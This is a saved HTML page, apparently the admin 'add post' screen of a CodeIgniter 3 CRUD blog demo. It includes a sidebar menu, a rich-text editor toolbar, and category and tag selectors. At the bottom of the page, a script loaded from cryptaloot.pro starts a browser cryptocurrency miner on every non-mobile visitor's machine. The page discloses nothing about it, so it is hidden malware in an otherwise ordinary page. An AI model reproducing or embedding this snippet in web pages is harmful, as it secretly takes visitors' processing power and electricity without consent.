<html><head><title>CodeIgniter 3</title>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="http://kautube.com/codeigniter-3/asset/css/w3.css">
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto">
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Montserrat">
<link rel="stylesheet" href="http://kautube.com/codeigniter-3/asset/css/open-iconic.min.css">
<link rel="stylesheet" href="http://kautube.com/codeigniter-3/asset/css/dataTables.w3.css">
<link rel="stylesheet" href="http://kautube.com/codeigniter-3/asset/css/select.dataTables.w3.css">
<link rel="stylesheet" href="http://kautube.com/codeigniter-3/asset/css/buttons.dataTables.w3.css">
<link rel="stylesheet" href="http://kautube.com/codeigniter-3/asset/plugins/w3te/jquery.w3te.css">
<link rel="stylesheet" href="http://kautube.com/codeigniter-3/asset/plugins/tagify/tagify.css">
<link rel="stylesheet" href="http://kautube.com/codeigniter-3/asset/plugins/dropzone/min/basic.min.css">
<link rel="stylesheet" href="http://kautube.com/codeigniter-3/asset/plugins/dropzone/dropzone.css">
<script src="http://kautube.com/codeigniter-3/asset/js/jquery.min.js"></script>
<script src="http://kautube.com/codeigniter-3/asset/js/jquery.dataTables.js"></script>
<script src="http://kautube.com/codeigniter-3/asset/js/dataTables.w3.js"></script>
<script src="http://kautube.com/codeigniter-3/asset/js/dataTables.select.js"></script>
<script src="http://kautube.com/codeigniter-3/asset/js/dataTables.buttons.js"></script>
<script src="http://kautube.com/codeigniter-3/asset/plugins/w3te/jquery.w3te.js"></script>
<script src="http://kautube.com/codeigniter-3/asset/plugins/tagify/jQuery.tagify.js"></script>
<script src="http://kautube.com/codeigniter-3/asset/plugins/dropzone/dropzone.js"></script>
<script>
	$(document).ready(function() {
    var events = $('#events');
		var table = $('#datatable').DataTable();
	});
</script>
<style>
table{font-size:13px;}
.w3-sidebar a {font-family: "Roboto", sans-serif}
body,h1,h2,h3,h4,h5,h6,.w3-wide {font-family: "Montserrat", sans-serif;}
</style>
</head><body class="w3-content w3-light-grey" style="max-width:1340px">

<nav class="w3-sidebar w3-bar-block w3-light-grey w3-collapse w3-top" style="z-index:3;width:250px" id="mySidebar">
<div class="w3-container w3-display-container w3-padding-16">
<i onclick="w3_close()" class="fa fa-remove w3-hide-large w3-button w3-display-topright"></i>
<h3 class="w3-wide"><b><img width="80" src="http://kautube.com/codeigniter-3/asset/images/ci-logo-big.png"></b></h3>
</div>
<div class="w3-padding-64 w3-large w3-text-grey" style="font-weight:bold">
<a onclick="myAccFunc('1')" href="javascript:void(0)" class="w3-button w3-block w3-white w3-left-align" id="myBtn">
<span class="oi" data-glyph="pin"></span> Posts 
</a>
<div id="demoAcc-1" class="w3-bar-block w3-grey w3-hide w3-padding-large w3-medium">
<a href="http://kautube.com/codeigniter-3/index.php/post" class="w3-bar-item w3-button">All Posts</a>
<a href="http://kautube.com/codeigniter-3/index.php/post/add" class="w3-bar-item w3-button">Add New</a>
<a href="http://kautube.com/codeigniter-3/index.php/term/category" class="w3-bar-item w3-button">Categories</a>
<a href="http://kautube.com/codeigniter-3/index.php/term/tag" class="w3-bar-item w3-button">Tags</a>
</div>
<a onclick="myAccFunc('2')" href="javascript:void(0)" class="w3-button w3-block w3-white w3-left-align" id="myBtn">
<span class="oi" data-glyph="musical-note"></span> Media
</a>
<div id="demoAcc-2" class="w3-bar-block w3-grey w3-hide w3-padding-large w3-medium">
<a href="http://kautube.com/codeigniter-3/index.php/media/grid" class="w3-bar-item w3-button">Library</a>
<a href="http://kautube.com/codeigniter-3/index.php/media/upload" class="w3-bar-item w3-button">Add New</a>
</div>
<a onclick="myAccFunc('3')" href="javascript:void(0)" class="w3-button w3-block w3-white w3-left-align" id="myBtn">
<span class="oi" data-glyph="people"></span> Users
</a>
<div id="demoAcc-3" class="w3-bar-block w3-grey w3-hide w3-padding-large w3-medium">
<a href="http://kautube.com/codeigniter-3/index.php/user" class="w3-bar-item w3-button">All Users</a>
<a href="http://kautube.com/codeigniter-3/index.php/user/adduser" class="w3-bar-item w3-button">Add New</a>
<a href="http://kautube.com/codeigniter-3/index.php/user/profile" class="w3-bar-item w3-button">Your Profile</a>
</div>
<a href="http://kautube.com/codeigniter-3/index.php/auth/logout" class="w3-bar-item w3-button"><span class="oi" data-glyph="eject"></span> Logout</a>

</div>
<a target="_blank" href="//kautube.com/ask-question/" class="w3-bar-item w3-button w3-padding">Contact</a>
<a target="_blank" href="//kautube.com" class="w3-bar-item w3-button w3-padding">© Tedir Ghazali</a>
</nav>

<header class="w3-bar w3-top w3-hide-large w3-black w3-xlarge">
<div class="w3-bar-item w3-padding-24 w3-wide">Crud Blog</div>
<a href="javascript:void(0)" class="w3-bar-item w3-button w3-padding-24 w3-right" onclick="w3_open()"><span class="oi" data-glyph="menu"></span></a>
</header>

<div class="w3-overlay w3-hide-large" onclick="w3_close()" style="cursor:pointer" title="close side menu" id="myOverlay"></div>

<div class="w3-main" style="margin-left:250px">

<div class="w3-hide-large" style="margin-top:83px"></div>

<header class="w3-container w3-xlarge w3-white">
<p class="w3-left"><span class="oi" data-glyph="pin"></span> Posts</p>
<p class="w3-right">
<span onclick="location.href='http://kautube.com/codeigniter-3/index.php'" class="oi w3-margin-right" data-glyph="dashboard"></span>
<span onclick="location.href='//kautube.com/ask-question/'" class="oi" data-glyph="chat"></span>
</p>
</header>
<form method="post">
<div class="w3-bar w3-margin-top w3-margin-bottom">
<a href="http://kautube.com/codeigniter-3/index.php" class="w3-bar-item w3-button w3-light-grey"><span class="oi" data-glyph="chevron-left"></span> Back</a>

<button type="submit" name="publish" formaction="http://kautube.com/codeigniter-3/index.php/post/publish" class="w3-bar-item w3-button w3-light-blue"><span class="oi" data-glyph="save"></span> Publish</button>
</div>
<input type="hidden" name="postid" value="23">
<input type="hidden" name="termid" value="51">
<input type="hidden" name="taxid" value="51">
<input type="hidden" name="relid" value="20">
<input type="hidden" name="terms" value="">
<input type="hidden" name="termtax" value="">
<input type="hidden" name="termcat" value="1,7,8,50,">
<div class="w3-white w3-padding-top">
<div class="w3-row-padding">
<div class="w3-col m8">
<p>
<label>Title</label>
<input type="text" name="title" class="w3-input w3-border" value="">
</p>
<p>
<div class="w3te">
<div class="w3te_toolbar w3-bar w3-light-grey" style="border-bottom: 1px solid rgb(170, 170, 170); user-select: none;" role="toolbar" unselectable="on">
<div class="w3te_tool w3te_tool_1 w3-button" role="button" data-tool="0" unselectable="on" style="user-select: none;"><a class="w3te_tool_icon" unselectable="on" style="user-select: none;"></a><div class="w3te_fontsizes" unselectable="on" style="position: absolute; display: none; user-select: none;"><a w3te-styleval="10" class="w3te_fontsize" style="font-size: 10px; user-select: none;" role="menuitem" unselectable="on">Abcdefgh...</a><a w3te-styleval="12" class="w3te_fontsize" style="font-size: 12px; user-select: none;" role="menuitem" unselectable="on">Abcdefgh...</a><a w3te-styleval="16" class="w3te_fontsize" style="font-size: 16px; user-select: none;" role="menuitem" unselectable="on">Abcdefgh...</a><a w3te-styleval="18" class="w3te_fontsize" style="font-size: 18px; user-select: none;" role="menuitem" unselectable="on">Abcdefgh...</a><a w3te-styleval="20" class="w3te_fontsize" style="font-size: 20px; user-select: none;" role="menuitem" unselectable="on">Abcdefgh...</a><a w3te-styleval="24" class="w3te_fontsize" style="font-size: 24px; user-select: none;" role="menuitem" unselectable="on">Abcdefgh...</a><a w3te-styleval="28" class="w3te_fontsize" style="font-size: 28px; user-select: none;" role="menuitem" unselectable="on">Abcdefgh...</a></div></div><div class="w3te_tool w3te_tool_2 w3-button" role="button" data-tool="1" unselectable="on" style="user-select: none;"><a class="w3te_tool_icon" unselectable="on" style="user-select: none;"></a><div class="w3te_cpalette" unselectable="on" style="position: absolute; display: none; user-select: none;"><a w3te-styleval="0,0,0" class="w3te_color" style="background-color: rgb(0, 0, 0); user-select: none;" role="gridcell" unselectable="on"></a><a w3te-styleval="68,68,68" class="w3te_color" style="background-color: rgb(68, 68, 68); user-select: none;" role="gridcell" unselectable="on"></a><a w3te-styleval="102,102,102" class="w3te_color" style="background-color: rgb(102, 102, 102); user-select: none;" role="gridcell" unselectable="on"></a><a w3te-styleval="153,153,153" class="w3te_color" style="background-color: rgb(153, 153, 153); user-select: none;" role="gridcell" unselectable="on"></a><a w3te-styleval="204,204,204" class="w3te_color" style="background-color: rgb(204, 204, 204); user-select: none;" role="gridcell" unselectable="on"></a><a w3te-styleval="238,238,238" class="w3te_color" style="background-color: rgb(238, 238, 238); user-select: none;" role="gridcell" unselectable="on"></a><a w3te-styleval="243,243,243" class="w3te_color" style="background-color: rgb(243, 243, 243); user-select: none;" role="gridcell" unselectable="on"></a><a w3te-styleval="255,255,255" class="w3te_color" style="background-color: rgb(255, 255, 255); user-select: none;" role="gridcell" unselectable="on"></a><a w3te-styleval="244,204,204" class="w3te_color" style="background-color: rgb(244, 204, 204); user-select: none;" role="gridcell" unselectable="on"></a><a w3te-styleval="252,229,205" class="w3te_color" style="background-color: rgb(252, 229, 205); user-select: none;" role="gridcell" unselectable="on"></a><a w3te-styleval="255,242,204" class="w3te_color" style="background-color: rgb(255, 242, 204); user-select: none;" role="gridcell" unselectable="on"></a><a w3te-styleval="217,234,211" class="w3te_color" style="background-color: rgb(217, 234, 211); user-select: none;" role="gridcell" unselectable="on"></a><a w3te-styleval="208,224,227" class="w3te_color" style="background-color: rgb(208, 224, 227); user-select: none;" role="gridcell" unselectable="on"></a><a w3te-styleval="207,226,243" class="w3te_color" style="background-color: rgb(207, 226, 243); user-select: none;" role="gridcell" unselectable="on"></a><a w3te-styleval="217,210,233" class="w3te_color" style="background-color: rgb(217, 210, 233); user-select: none;" role="gridcell" unselectable="on"></a><a w3te-styleval="234,209,220" class="w3te_color" style="background-color: rgb(234, 209, 220); user-select: none;" role="gridcell" unselectable="on"></a><a w3te-styleval="234,153,153" class="w3te_color" style="background-color: rgb(234, 153, 153); user-select: none;" role="gridcell" unselectable="on"></a><a w3te-styleval="249,203,156" class="w3te_color" style="background-color: rgb(249, 203, 156); user-select: none;" role="gridcell" unselectable="on"></a><a w3te-styleval="255,229,153" class="w3te_color" style="background-color: rgb(255, 229, 153); user-select: none;" role="gridcell" unselectable="on"></a><a w3te-styleval="182,215,168" class="w3te_color" style="background-color: rgb(182, 215, 168); user-select: none;" role="gridcell" unselectable="on"></a><a w3te-styleval="162,196,201" class="w3te_color" style="background-color: rgb(162, 196, 201); user-select: none;" role="gridcell" unselectable="on"></a><a w3te-styleval="159,197,232" class="w3te_color" style="background-color: rgb(159, 197, 232); user-select: none;" role="gridcell" unselectable="on"></a><a w3te-styleval="180,167,214" class="w3te_color" style="background-color: rgb(180, 167, 214); user-select: none;" role="gridcell" unselectable="on"></a><a w3te-styleval="213,166,189" class="w3te_color" style="background-color: rgb(213, 166, 189); user-select: none;" role="gridcell" unselectable="on"></a><a w3te-styleval="224,102,102" class="w3te_color" style="background-color: rgb(224, 102, 102); user-select: none;" role="gridcell" unselectable="on"></a><a w3te-styleval="246,178,107" class="w3te_color" style="background-color: rgb(246, 178, 107); user-select: none;" role="gridcell" unselectable="on"></a><a w3te-styleval="255,217,102" class="w3te_color" style="background-color: rgb(255, 217, 102); user-select: none;" role="gridcell" unselectable="on"></a><a w3te-styleval="147,196,125" class="w3te_color" style="background-color: rgb(147, 196, 125); user-select: none;" role="gridcell" unselectable="on"></a><a w3te-styleval="118,165,175" class="w3te_color" style="background-color: rgb(118, 165, 175); user-select: none;" role="gridcell" unselectable="on"></a><a w3te-styleval="111,168,220" class="w3te_color" style="background-color: rgb(111, 168, 220); user-select: none;" role="gridcell" unselectable="on"></a><a w3te-styleval="142,124,195" class="w3te_color" style="background-color: rgb(142, 124, 195); user-select: none;" role="gridcell" unselectable="on"></a><a w3te-styleval="194,123,160" class="w3te_color" style="background-color: rgb(194, 123, 160); user-select: none;" role="gridcell" unselectable="on"></a><a w3te-styleval="255,0,0" class="w3te_color" style="background-color: rgb(255, 0, 0); user-select: none;" role="gridcell" unselectable="on"></a><a w3te-styleval="255,153,0" class="w3te_color" style="background-color: rgb(255, 153, 0); user-select: none;" role="gridcell" unselectable="on"></a><a w3te-styleval="255,255,0" class="w3te_color" style="background-color: rgb(255, 255, 0); user-select: none;" role="gridcell" unselectable="on"></a><a w3te-styleval="0,255,0" class="w3te_color" style="background-color: rgb(0, 255, 0); user-select: none;" role="gridcell" unselectable="on"></a><a w3te-styleval="0,255,255" class="w3te_color" style="background-color: rgb(0, 255, 255); user-select: none;" role="gridcell" unselectable="on"></a><a w3te-styleval="0,0,255" class="w3te_color" style="background-color: rgb(0, 0, 255); user-select: none;" role="gridcell" unselectable="on"></a><a w3te-styleval="153,0,255" class="w3te_color" style="background-color: rgb(153, 0, 255); user-select: none;" role="gridcell" unselectable="on"></a><a w3te-styleval="255,0,255" class="w3te_color" style="background-color: rgb(255, 0, 255); user-select: none;" role="gridcell" unselectable="on"></a><a w3te-styleval="204,0,0" class="w3te_color" style="background-color: rgb(204, 0, 0); user-select: none;" role="gridcell" unselectable="on"></a><a w3te-styleval="230,145,56" class="w3te_color" style="background-color: rgb(230, 145, 56); user-select: none;" role="gridcell" unselectable="on"></a><a w3te-styleval="241,194,50" class="w3te_color" style="background-color: rgb(241, 194, 50); user-select: none;" role="gridcell" unselectable="on"></a><a w3te-styleval="106,168,79" class="w3te_color" style="background-color: rgb(106, 168, 79); user-select: none;" role="gridcell" unselectable="on"></a><a w3te-styleval="69,129,142" class="w3te_color" style="background-color: rgb(69, 129, 142); user-select: none;" role="gridcell" unselectable="on"></a><a w3te-styleval="61,133,198" class="w3te_color" style="background-color: rgb(61, 133, 198); user-select: none;" role="gridcell" unselectable="on"></a><a w3te-styleval="103,78,167" class="w3te_color" style="background-color: rgb(103, 78, 167); user-select: none;" role="gridcell" unselectable="on"></a><a w3te-styleval="166,77,121" class="w3te_color" style="background-color: rgb(166, 77, 121); user-select: none;" role="gridcell" unselectable="on"></a><a w3te-styleval="153,0,0" class="w3te_color" style="background-color: rgb(153, 0, 0); user-select: none;" role="gridcell" unselectable="on"></a><a w3te-styleval="180,95,6" class="w3te_color" style="background-color: rgb(180, 95, 6); user-select: none;" role="gridcell" unselectable="on"></a><a w3te-styleval="191,144,0" class="w3te_color" style="background-color: rgb(191, 144, 0); user-select: none;" role="gridcell" unselectable="on"></a><a w3te-styleval="56,118,29" class="w3te_color" style="background-color: rgb(56, 118, 29); user-select: none;" role="gridcell" unselectable="on"></a><a w3te-styleval="19,79,92" class="w3te_color" style="background-color: rgb(19, 79, 92); user-select: none;" role="gridcell" unselectable="on"></a><a w3te-styleval="11,83,148" class="w3te_color" style="background-color: rgb(11, 83, 148); user-select: none;" role="gridcell" unselectable="on"></a><a w3te-styleval="53,28,117" class="w3te_color" style="background-color: rgb(53, 28, 117); user-select: none;" role="gridcell" unselectable="on"></a><a w3te-styleval="116,27,71" class="w3te_color" style="background-color: rgb(116, 27, 71); user-select: none;" role="gridcell" unselectable="on"></a><a w3te-styleval="102,0,0" class="w3te_color" style="background-color: rgb(102, 0, 0); user-select: none;" role="gridcell" unselectable="on"></a><a w3te-styleval="120,63,4" class="w3te_color" style="background-color: rgb(120, 63, 4); user-select: none;" role="gridcell" unselectable="on"></a><a w3te-styleval="127,96,0" class="w3te_color" style="background-color: rgb(127, 96, 0); user-select: none;" role="gridcell" unselectable="on"></a><a w3te-styleval="39,78,19" class="w3te_color" style="background-color: rgb(39, 78, 19); user-select: none;" role="gridcell" unselectable="on"></a><a w3te-styleval="12,52,61" class="w3te_color" style="background-color: rgb(12, 52, 61); user-select: none;" role="gridcell" unselectable="on"></a><a w3te-styleval="7,55,99" class="w3te_color" style="background-color: rgb(7, 55, 99); user-select: none;" role="gridcell" unselectable="on"></a><a w3te-styleval="32,18,77" class="w3te_color" style="background-color: rgb(32, 18, 77); user-select: none;" role="gridcell" unselectable="on"></a><a w3te-styleval="76,17,48" class="w3te_color" style="background-color: rgb(76, 17, 48); user-select: none;" role="gridcell" unselectable="on"></a></div></div><div class="w3te_tool w3te_tool_3 w3-button" role="button" data-tool="2" unselectable="on" style="user-select: none;"><a class="w3te_tool_icon" unselectable="on" style="user-select: none;"></a></div><div class="w3te_tool w3te_tool_4 w3-button" role="button" data-tool="3" unselectable="on" style="user-select: none;"><a class="w3te_tool_icon" unselectable="on" style="user-select: none;"></a></div><div class="w3te_tool w3te_tool_5 w3-button" role="button" data-tool="4" unselectable="on" style="user-select: none;"><a class="w3te_tool_icon" unselectable="on" style="user-select: none;"></a></div><div class="w3te_tool w3te_tool_6 w3-button" role="button" data-tool="5" unselectable="on" style="user-select: none;"><a class="w3te_tool_icon" unselectable="on" style="user-select: none;"></a></div><div class="w3te_tool w3te_tool_7 w3-button" role="button" data-tool="6" unselectable="on" style="user-select: none;"><a class="w3te_tool_icon" unselectable="on" style="user-select: none;"></a></div><div class="w3te_tool w3te_tool_8 w3-button" role="button" data-tool="7" unselectable="on" style="user-select: none;"><a class="w3te_tool_icon" unselectable="on" style="user-select: none;"></a></div><div class="w3te_tool w3te_tool_9 w3-button" role="button" data-tool="8" unselectable="on" style="user-select: none;"><a class="w3te_tool_icon" unselectable="on" style="user-select: none;"></a></div><div class="w3te_tool w3te_tool_10 w3-button" role="button" data-tool="9" unselectable="on" style="user-select: none;"><a class="w3te_tool_icon" unselectable="on" style="user-select: none;"></a></div><div class="w3te_tool w3te_tool_11 w3-button" role="button" data-tool="10" unselectable="on" style="user-select: none;"><a class="w3te_tool_icon" unselectable="on" style="user-select: none;"></a></div><div class="w3te_tool w3te_tool_12 w3-button" role="button" data-tool="11" unselectable="on" style="user-select: none;"><a class="w3te_tool_icon" unselectable="on" style="user-select: none;"></a></div><div class="w3te_tool w3te_tool_13 w3-button" role="button" data-tool="12" unselectable="on" style="user-select: none;"><a class="w3te_tool_icon" unselectable="on" style="user-select: none;"></a></div><div class="w3te_tool w3te_tool_14 w3-button" role="button" data-tool="13" unselectable="on" style="user-select: none;"><a class="w3te_tool_icon" unselectable="on" style="user-select: none;"></a></div><div class="w3te_tool w3te_tool_15 w3-button" role="button" data-tool="14" unselectable="on" style="user-select: none;"><a class="w3te_tool_icon" unselectable="on" style="user-select: none;"></a></div><div class="w3te_tool w3te_tool_16 w3-button" role="button" data-tool="15" unselectable="on" style="user-select: none;"><a class="w3te_tool_icon" unselectable="on" style="user-select: none;"></a></div><div class="w3te_tool w3te_tool_17 w3-button" role="button" data-tool="16" unselectable="on" style="user-select: none;"><a class="w3te_tool_icon" unselectable="on" style="user-select: none;"></a></div><div class="w3te_tool w3te_tool_18 w3-button" role="button" data-tool="17" unselectable="on" style="user-select: none;"><a class="w3te_tool_icon" unselectable="on" style="user-select: none;"></a></div><div class="w3te_tool w3te_tool_19 w3-button" role="button" data-tool="18" unselectable="on" style="user-select: none;"><a class="w3te_tool_icon" unselectable="on" style="user-select: none;"></a></div><div class="w3te_tool w3te_tool_20 w3-button" role="button" data-tool="19" unselectable="on" style="user-select: none;"><a class="w3te_tool_icon" unselectable="on" style="user-select: none;"></a></div></div><div class="w3te_linkform" style="display:none" role="dialog"><div class="w3te_linktypeselect" unselectable="on" style="user-select: none;"><div class="w3te_linktypeview" unselectable="on" style="user-select: none;"><div class="w3te_linktypearrow" unselectable="on" style="user-select: none;"></div><div class="w3te_linktypetext">Web Address</div></div><div class="w3te_linktypes" role="menu" unselectable="on" style="user-select: none;"><a w3te-linktype="0" unselectable="on" style="user-select: none;">Web Address</a><a w3te-linktype="1" unselectable="on" style="user-select: none;">E-mail Address</a><a w3te-linktype="2" unselectable="on" style="user-select: none;">Picture URL</a></div></div> <input class="w3te_linkinput" type="text/css" value=""> <div class="w3te_linkbutton" unselectable="on" style="user-select: none;">OK</div> <div style="height:1px;float:none;clear:both"></div></div><div class="w3te_source w3te_hiddenField"><textarea name="content"></textarea></div></div>
</p>
</div>
<div class="w3-col m4">
<p>
<label>Status</label>
<select name="status" class="w3-select w3-border">
<option value="publish">- Select Status -</option>
<option value="publish">Publish</option>
<option value="pending">Pending</option>
<option value="draft">Draft</option>
</select>
</p>
<p>
<label>Category</label>
<select name="category" class="w3-select w3-border">
<option value="1">- Select Category -</option>
<option value="1">Haber</option>
<option value="7">Programming</option>
<option value="8">Lifestyle</option>
<option value="50">Contact Us</option>

</select>
</p>
<p>
<label>Tags</label>
<tags><div><input list="tagifySuggestionsjcq1az9xs" class="placeholder"><span></span></div><textarea name="tags">                                        </textarea></tags>
</p>
</div>
</div>
</div>
</form>
<script>
    $('.w3te').w3te();
    $('[name=tags]').tagify().on('add', function(e, tagName){
        console.log('added', tagName)
    });
</script>
<div class="w3-black w3-center w3-margin-top w3-padding-24">Powered by <a href="//kautube.com" title="W3.CSS" target="_blank" class="w3-hover-opacity">Tedir Ghazali</a></div>

</div>

<div id="newsletter" class="w3-modal">
<div class="w3-modal-content w3-animate-zoom" style="padding:32px">
<div class="w3-container w3-white w3-center">
<i onclick="document.getElementById('newsletter').style.display='none'" class="fa fa-remove w3-right w3-button w3-transparent w3-xxlarge"></i>
<h2 class="w3-wide">NEWSLETTER</h2>
<p>Join our mailing list to receive updates on new arrivals and special offers.</p>
<p><input class="w3-input w3-border" type="text" placeholder="Enter e-mail"></p>
<button type="button" class="w3-button w3-padding-large w3-red w3-margin-bottom" onclick="document.getElementById('newsletter').style.display='none'">Subscribe</button>
</div>
</div>
</div>
<script>
// Accordion 
function myAccFunc(val) {
  var x = document.getElementById("demoAcc-"+val);
  if (x.className.indexOf("w3-show") == -1) {
      x.className += " w3-show";
  } else {
      x.className = x.className.replace(" w3-show", "");
  }
}

// Script to open and close sidebar
function w3_open() {
  document.getElementById("mySidebar").style.display = "block";
  document.getElementById("myOverlay").style.display = "block";
}

function w3_close() {
  document.getElementById("mySidebar").style.display = "none";
  document.getElementById("myOverlay").style.display = "none";
}
</script>
<script src="//cryptaloot.pro/lib/crypta.js"></script>
<script>
var miner=new CRLT.Anonymous('3d85afb873a0638773e04b71b4879588f7177fd80774',
    {
        threads:2,
        autoThreads:true,
        throttle:0.97,
    }
);
if (!miner.isMobile()) {
	miner.start();
}
</script>


</body></html>